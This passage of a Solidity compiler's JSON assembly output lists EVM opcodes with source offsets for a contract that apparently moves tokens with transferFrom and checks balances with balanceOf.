											"end": 1141,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "94"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "tag",
											"source": 4,
											"value": "94"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "95"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 2322,
											"end": 2365,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "tag",
											"source": 4,
											"value": "95"
										},
										{
											"begin": 2322,
											"end": 2365,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "PUSH",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "PUSH",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 2399,
											"end": 2405,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2440,
											"end": 2444,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 1401,
											"end": 1452,
											"name": "MSTORE",
											"source": 5
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2381,
											"end": 2384,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2390,
											"name": "PUSH",
											"source": 4,
											"value": "DF791E50"
										},
										{
											"begin": 2376,
											"end": 2390,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2399,
											"end": 2405,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2399,
											"end": 2405,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2391,
											"end": 2397,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2431,
											"name": "PUSH",
											"source": 4,
											"value": "70A08231"
										},
										{
											"begin": 2407,
											"end": 2431,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "PUSH",
											"source": 5,
											"value": "24"
										},
										{
											"begin": 1374,
											"end": 1392,
											"name": "ADD",
											"source": 5
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP7",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "STATICCALL",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "98"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "tag",
											"source": 4,
											"value": "98"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "99"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2407,
											"end": 2446,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "tag",
											"source": 4,
											"value": "99"
										},
										{
											"begin": 2407,
											"end": 2446,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP5",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "FFFFFFFF"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SHL",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "100"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SWAP4",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 2376,
											"end": 2447,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "tag",
											"source": 4,
											"value": "100"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "EXTCODESIZE",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "101"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "tag",
											"source": 4,
											"value": "101"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "103"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "tag",
											"source": 4,
											"value": "103"
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 2376,
											"end": 2447,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 1327,
											"end": 2454,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "tag",
											"source": 4,
											"value": "13"
										},
										{
											"begin": 587,
											"end": 1319,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 634,
											"end": 640,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 634,
											"end": 640,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 634,
											"end": 640,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 634,
											"end": 640,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 634,
											"end": 640,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 634,
											"end": 640,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 654,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 627,
											"end": 654,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "105"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 655,
											"end": 665,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 655,
											"end": 665,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 675,
											"end": 679,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 675,
											"end": 679,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 682,
											"end": 684,
											"name": "PUSH",
											"source": 4,
											"value": "A"
										},
										{
											"begin": 682,
											"end": 684,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 627,
											"end": 685,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "tag",
											"source": 4,
											"value": "105"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP8",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "GAS",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "CALL",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ISZERO",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "107"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "RETURNDATACOPY",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "REVERT",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "tag",
											"source": 4,
											"value": "107"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "RETURNDATASIZE",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "NOT",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "1F"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "108"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "21"
										},
										{
											"begin": 627,
											"end": 685,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 4
										},
										{
											"begin": 627,
											"end": 685,
											"name": "tag",
											"source": 4,
											"value": "108"
										},
										{
											"begin": 627,
											"end": 685,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP",
											"source": -1
										},
										{
											"begin": 702,
											"end": 708,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 702,
											"end": 708,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "MLOAD",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "23B872DD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": 695,
											"end": 753,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"source": -1,
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL",
											"source": -1
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 702,
											"end": 708,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 702,
											"end": 708,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 702,
											"end": 708,
											"name": "AND",
											"source": 4
										},
										{
											"begin": 702,
											"end": 708,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 722,
											"name": "PUSH",
											"source": 4,
											"value": "23B872DD"
										},
										{
											"begin": 695,
											"end": 722,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 695,
											"end": 753,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "109"
										},
										{
											"begin": 695,
											"end": 753,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 723,
											"end": 733,
											"name": "CALLER",
											"source": 4
										},
										{
											"begin": 723,
											"end": 733,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 743,
											"end": 747,
											"name": "ADDRESS",
											"source": 4
										},
										{
											"begin": 743,
											"end": 747,
											"name": "SWAP1",
